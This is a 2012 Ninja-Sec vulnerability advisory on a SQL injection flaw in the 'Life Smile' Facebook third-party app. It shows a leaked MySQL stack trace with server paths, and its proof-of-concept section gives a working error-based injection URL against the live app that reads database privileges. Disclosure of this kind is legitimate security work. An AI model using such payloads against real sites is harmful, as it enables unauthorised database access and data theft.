Title:
======
Facebook Life Smile - SQL Injection Vulnerability


Date:
=====
2012-02-14


References:
===========
http://www.Ninja-Sec.com



Introduction:
=============
The application is currently included and viewable by all facebook users.
The service is an external 3rd party application sponsored by the Facebook
lifesmile Development Team.

(Copy from the Vendors Homepage: http://apps.facebook.com/lifesmile/)

Facebook is a social networking service and website launched in February
2004, operated and privately owned
by Facebook, Inc. As of July 2011, Facebook has more than 750 million
active users. Users may create
a personal profile, add other users as friends, and exchange messages,
including automatic notifications when
they update their profile. Facebook users must register before using the
site. Additionally, users may join
common-interest user groups, organized by workplace, school or college, or
other characteristics.

(Copy of the Vendor Website: http://en.wikipedia.org/wiki/Facebook)


Abstract:
=========
Ninja-Sec discovered a remote SQL Injection vulnerability on the 3rd party
web
application - Facebook Life Smile  (apps.facebook.com).


Report-Timeline:
================
2012-02-02:  Vendor Notification
2012-02-02:  Developer Notification
2012-02-04:  Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
High


Details:
========
A remote SQL Injection vulnerability is detected on the Facebook Life Smile
(apps.facebook).
The vulnerability allows an attacker (remote) to inject/execute own sql
statements on the affected fb application dbms.

Vulnerable Module(s):
                                  [+] Life Smile - Facebook 3rd Party
Application

Vulnerable Param(s)/File(s):
                                  [+] index.php


Affected Application:
                                  [+] apps.facebook.com/lifesmile/




Sql Error

---

Fatal error: Uncaught exception 'ADODB_Exception' with message 'mysql
error: [1064: You have an error in your SQL syntax; check the manual that
corresponds to your MySQL server version for the right syntax to use near
'' at line 1] in EXECUTE("select * from user WHERE id=") ' in
/var/www/smiles/lib/adodb/adodb-exceptions.inc.php:78 Stack trace: #0
/var/www/smiles/lib/adodb/adodb.inc.php(918): adodb_throw('mysql',
'EXECUTE', 1064, 'You have an err...', 'select * from u...', false,
Object(ADODB_mysql)) #1 /var/www/smiles/lib/adodb/adodb.inc.php(893):
ADOConnection->_Execute('select * from u...', false) #2
/var/www/smiles/lib/adodb/adodb.inc.php(1475):
ADOConnection->Execute('select * from u...', false) #3
/var/www/smiles/lib/adodb/adodb-active-record.inc.php(464):
ADOConnection->GetRow('select * from u...', false) #4
/var/www/smiles/bean/User.php(35): ADODB_Active_Record->Load('id=', false)
#5 /var/www/smiles/manager/core/FBManager.php(41): User->Load('id=', false,
false) #6 /var/www/smiles/manager/core/ApplicationManager.p in
/var/www/smiles/lib/adodb/adodb-exceptions.inc.php on line 78

----

Proof of Concept:
=================
The vulnerability can be exploited by remote attackers. For demonstration
or reproduce ...

URL:  http://apps.facebook.com/
Path:  /lifesmile/
File:  index.php


Example:

http://[APP-SERVER]/[SERVICE-APP]/[FILE].[PHP]?=[SQL Injection]


PoC:

http://apps.facebook.com/lifesmile/index.php?page=[SQL-Injection]

Real World Demo :

http://apps.facebook.com/lifesmile/index.php?page=210 AND (SELECT 1793
FROM(SELECT COUNT(*),CONCAT(0x3a626a7a3a,(SELECT
MID((IFNULL(CAST(privilege_type AS CHAR),0x20)),1,50) FROM
INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT
0,1),0x3a7672703a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS
GROUP BY x)a)


Risk:
=====
The security risk of the application sql injection vulnerabilities are
estimated as high(+).


Credits:
========
Ninja-Sec Research Laboratory - Mohamed Saad (Anti-Trust)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any
warranty. Ninja-Sec disclaims all warranties,
either expressed or implied, including the warranties of merchantability
and capability for a particular purpose. Ninja-Sec or its suppliers are not
liable in any case of damage, including direct, indirect, incidental,
consequential loss of business
profits or special damages, even if Ninja-Sec.com or its suppliers have
been advised of the possibility of such damages. Some
states do not allow the exclusion or limitation of liability for
consequential or incidental damages so the foregoing limitation
may not apply. Any modified copy or reproduction, including partially
usages, of this file requires authorization from Ninja-Sec. Permission to
electronically redistribute this alert in its unmodified form is granted.
All other rights, including the use of
other media, are reserved by Ninja-Sec or its suppliers.

Copyright © 2012|Ninja-Sec




-- 
Website: www.Ninja-Sec.com
Contact: NinjaSec007@gmail.com
